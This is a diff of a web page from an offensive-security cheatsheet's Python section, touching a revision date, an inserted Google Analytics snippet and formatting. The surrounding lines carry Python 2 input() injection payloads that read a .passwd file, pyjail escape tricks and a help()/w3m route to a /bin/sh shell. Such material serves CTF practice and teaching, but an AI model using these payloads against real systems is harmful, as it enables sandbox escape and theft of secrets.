@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2022-09-11T16:52:52 CEST">
+<meta name="revised" content="2023-02-14T12:07:00 CET">
 <title>Python :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -27,7 +27,36 @@
     
       <header>
   <div class="logo">
-    <a class="baselink" href="/">Offensive Security Cheatsheet</a>
+    <head>
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+</head>
+<a class="baselink" href="/">Offensive Security Cheatsheet</a>
+
   </div>
   <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
     <nav class="shortcuts">
@@ -1817,14 +1846,12 @@
     
     
     
-    
-
-<h3 id="input-exploitation">Input() exploitation</h3>
+    <h3 id="input-exploitation">Input() exploitation</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># In Python2, input function is vulnerable</span>
 <span style="color:#75715e"># input(x) = eval(raw_input(x))</span>
 <span style="color:#75715e"># Means that user inputs will be executed</span>
 
-<span style="color:#75715e"># You can exec code</span> 
+<span style="color:#75715e"># You can exec code </span>
 Please enter password : sys.stdout.write<span style="color:#f92672">(</span>open<span style="color:#f92672">(</span><span style="color:#d88200">&#34;.passwd&#34;</span><span style="color:#f92672">)</span>.readline<span style="color:#f92672">())</span>  
 <span style="color:#ae81ff">13373439872909134298363103573901</span>
 
@@ -1841,11 +1868,10 @@ Please enter password : __import__<span style="color:#f92672">(</span><span styl
 <span style="color:#75715e"># Another</span>
 Please enter password : input<span style="color:#f92672">(</span>open<span style="color:#f92672">(</span><span style="color:#d88200">&#34;.passwd&#34;</span><span style="color:#f92672">)</span>.readline<span style="color:#f92672">())</span>
 
-<span style="color:#75715e"># Another</span> 
-Please enter password : __builtins__.__dict__<span style="color:#f92672">[</span><span style="color:#d88200">&#39;print&#39;</span><span style="color:#f92672">](</span>__builtins__.__dict__<span style="color:#f92672">[</span><span style="color:#d88200">&#39;open&#39;</span><span style="color:#f92672">](</span><span style="color:#d88200">&#39;.passwd&#39;</span>, <span style="color:#d88200">&#39;r&#39;</span><span style="color:#f92672">)</span>.read<span style="color:#f92672">())</span></code></pre></div>
-<p><br/></p>
-
-<h3 id="pyjail-only-print-and-no-quotes">Pyjail - Only print and no quotes</h3>
+<span style="color:#75715e"># Another </span>
+Please enter password : __builtins__.__dict__<span style="color:#f92672">[</span><span style="color:#d88200">&#39;print&#39;</span><span style="color:#f92672">](</span>__builtins__.__dict__<span style="color:#f92672">[</span><span style="color:#d88200">&#39;open&#39;</span><span style="color:#f92672">](</span><span style="color:#d88200">&#39;.passwd&#39;</span>, <span style="color:#d88200">&#39;r&#39;</span><span style="color:#f92672">)</span>.read<span style="color:#f92672">())</span>
+</code></pre></div><!-- raw HTML omitted -->
+<h3 id="pyjail---only-print-and-no-quotes">Pyjail - Only print and no quotes</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Exploration</span>
 <span style="color:#111">exit</span> <span style="color:#f92672">/</span> <span style="color:#111">exit</span><span style="color:#111">()</span> <span style="color:#f92672">/</span> <span style="color:#111">exit</span><span style="color:#111">(</span><span style="color:#ae81ff">1</span><span style="color:#111">)</span> <span style="color:#f92672">/</span> <span style="color:#111">exit</span><span style="color:#111">(</span><span style="color:#d88200">&#39;a&#39;</span><span style="color:#111">)</span>
 <span style="color:#75715e"># Try to assign variable, use import</span>
@@ -1875,10 +1901,9 @@ Please enter password : __builtins__.__dict__<span style="color:#f92672">[</span
 <span style="color:#00a8c8">print</span> <span style="color:#111">exit</span><span style="color:#f92672">.</span><span style="color:#111">func_code</span><span style="color:#f92672">.</span><span style="color:#111">co_consts</span>
 
 <span style="color:#75715e"># You can see the interesting variable and use it like this</span>
-<span style="color:#111">exit</span><span style="color:#111">(</span><span style="color:#111">exit</span><span style="color:#f92672">.</span><span style="color:#111">func_code</span><span style="color:#f92672">.</span><span style="color:#111">co_consts</span><span style="color:#111">[</span><span style="color:#ae81ff">1</span><span style="color:#111">])</span></code></pre></div>
-<p><br/></p>
-
-<h3 id="pyjail-no-dots-quotes-and-some-restricted-functions">Pyjail - No dots, quotes and some restricted functions</h3>
+<span style="color:#111">exit</span><span style="color:#111">(</span><span style="color:#111">exit</span><span style="color:#f92672">.</span><span style="color:#111">func_code</span><span style="color:#f92672">.</span><span style="color:#111">co_consts</span><span style="color:#111">[</span><span style="color:#ae81ff">1</span><span style="color:#111">])</span>
+</code></pre></div><!-- raw HTML omitted -->
+<h3 id="pyjail---no-dots-quotes-and-some-restricted-functions">Pyjail - No dots, quotes and some restricted functions</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># dir() is doing a return. You can see it if it&#39;s executed in the same environment</span>
 <span style="color:#75715e"># When it goes through an eval(), the return remains in this environment, so you need to print it</span>
 <span style="color:#00a8c8">print</span> <span style="color:#111">dir</span><span style="color:#111">()</span>
@@ -1922,10 +1947,9 @@ Please enter password : __builtins__.__dict__<span style="color:#f92672">[</span
 <span style="color:#75715e"># And then use the &#34;command&#34; function to grab “passw” and “d” to get the correct string back</span>
 <span style="color:#111">bytes</span><span style="color:#111">(</span><span style="color:#111">command</span><span style="color:#111">[</span><span style="color:#f92672">-</span><span style="color:#ae81ff">7</span><span style="color:#111">:</span><span style="color:#f92672">-</span><span style="color:#ae81ff">2</span><span style="color:#111">]</span> <span style="color:#f92672">+</span> <span style="color:#111">command</span><span style="color:#111">[</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#111">])</span>
 <span style="color:#111">(</span><span style="color:#111">bytes</span><span style="color:#111">(</span><span style="color:#111">round</span><span style="color:#111">(</span><span style="color:#ae81ff">1</span><span style="color:#f92672">/</span><span style="color:#ae81ff">3</span><span style="color:#111">))[</span><span style="color:#ae81ff">1</span><span style="color:#111">]</span> <span style="color:#f92672">+</span> <span style="color:#111">command</span><span style="color:#111">[</span><span style="color:#f92672">-</span><span style="color:#ae81ff">7</span><span style="color:#111">:</span><span style="color:#f92672">-</span><span style="color:#ae81ff">2</span><span style="color:#111">]</span> <span style="color:#f92672">+</span> <span style="color:#111">command</span><span style="color:#111">[</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#111">])</span>
-<span style="color:#00a8c8">print</span><span style="color:#111">(</span><span style="color:#111">next</span><span style="color:#111">(</span><span style="color:#111">open</span><span style="color:#111">(</span><span style="color:#111">bytes</span><span style="color:#111">(</span><span style="color:#111">round</span><span style="color:#111">(</span><span style="color:#ae81ff">1</span><span style="color:#f92672">/</span><span style="color:#ae81ff">3</span><span style="color:#111">))[</span><span style="color:#ae81ff">1</span><span style="color:#111">]</span> <span style="color:#f92672">+</span> <span style="color:#111">command</span><span style="color:#111">[</span><span style="color:#f92672">-</span><span style="color:#ae81ff">7</span><span style="color:#111">:</span><span style="color:#f92672">-</span><span style="color:#ae81ff">2</span><span style="color:#111">]</span> <span style="color:#f92672">+</span> <span style="color:#111">command</span><span style="color:#111">[</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#111">])))</span></code></pre></div>
-<p><br/></p>
-
-<h3 id="pyjail-generate-a-shell">Pyjail - Generate a shell</h3>
+<span style="color:#00a8c8">print</span><span style="color:#111">(</span><span style="color:#111">next</span><span style="color:#111">(</span><span style="color:#111">open</span><span style="color:#111">(</span><span style="color:#111">bytes</span><span style="color:#111">(</span><span style="color:#111">round</span><span style="color:#111">(</span><span style="color:#ae81ff">1</span><span style="color:#f92672">/</span><span style="color:#ae81ff">3</span><span style="color:#111">))[</span><span style="color:#ae81ff">1</span><span style="color:#111">]</span> <span style="color:#f92672">+</span> <span style="color:#111">command</span><span style="color:#111">[</span><span style="color:#f92672">-</span><span style="color:#ae81ff">7</span><span style="color:#111">:</span><span style="color:#f92672">-</span><span style="color:#ae81ff">2</span><span style="color:#111">]</span> <span style="color:#f92672">+</span> <span style="color:#111">command</span><span style="color:#111">[</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#111">])))</span>
+</code></pre></div><!-- raw HTML omitted -->
+<h3 id="pyjail---generate-a-shell">Pyjail - Generate a shell</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Trough help and a w3m console</span>
 <span style="color:#111">help</span><span style="color:#111">()</span>
 <span style="color:#111">help</span><span style="color:#f92672">&gt;</span> <span style="color:#111">modules</span>
@@ -1933,7 +1957,8 @@ Please enter password : __builtins__.__dict__<span style="color:#f92672">[</span
 <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#960050;background-color:#1e0010">→</span> <span style="color:#f92672">/</span><span style="color:#111">bin</span><span style="color:#f92672">/</span><span style="color:#111">sh</span>
 <span style="color:#f92672">/</span><span style="color:#111">bin</span><span style="color:#f92672">/</span><span style="color:#111">sh</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;&amp;</span><span style="color:#ae81ff">2</span>
 <span style="color:#111">reset</span>
-<span style="color:#111">cat</span> <span style="color:#f92672">.</span><span style="color:#111">passwd</span></code></pre></div>
+<span style="color:#111">cat</span> <span style="color:#f92672">.</span><span style="color:#111">passwd</span>
+</code></pre></div>
 
     
     
